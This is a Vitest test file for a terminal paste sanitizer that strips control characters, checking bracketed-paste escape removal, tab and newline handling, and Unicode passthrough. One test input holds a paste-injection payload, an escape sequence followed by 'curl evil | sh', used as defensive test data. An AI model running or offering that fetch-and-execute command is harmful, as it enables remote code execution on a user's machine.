import { describe, expect, it } from 'vitest'
import { hasControlCharacters, sanitizePaste } from './terminal-paste'

describe('sanitizePaste', () => {
  it('takes out what could end a bracketed paste', () => {
    expect(sanitizePaste('safe\x1b[201~; curl evil | sh')).toBe('safe[201~; curl evil | sh')
  })

  it('keeps tabs and line ends', () => {
    expect(sanitizePaste('a\tb\nc\r\nd')).toBe('a\tb\nc\r\nd')
  })

  it.each([
    ['NUL', '\x00'],
    ['BEL', '\x07'],
    ['backspace', '\x08'],
    ['vertical tab', '\x0b'],
    ['form feed', '\x0c'],
    ['ESC', '\x1b'],
    ['DEL', '\x7f'],
    ['C1 start', '\x80'],
    ['C1 CSI', '\x9b'],
    ['C1 end', '\x9f']
  ])('takes out %s, every time it appears', (_name, control) => {
    expect(sanitizePaste(`a${control}b${control}c`)).toBe('abc')
  })

  it('leaves other text alone', () => {
    expect(sanitizePaste('héllo ✅ 🚀 漢')).toBe('héllo ✅ 🚀 漢')
  })
})

describe('hasControlCharacters', () => {
  it('answers the same on every call, whatever came before', () => {
    expect(hasControlCharacters('a\x1bb')).toBe(true)
    expect(hasControlCharacters('a\x1bb')).toBe(true)
    expect(hasControlCharacters('a\tb\nc')).toBe(false)
  })
})
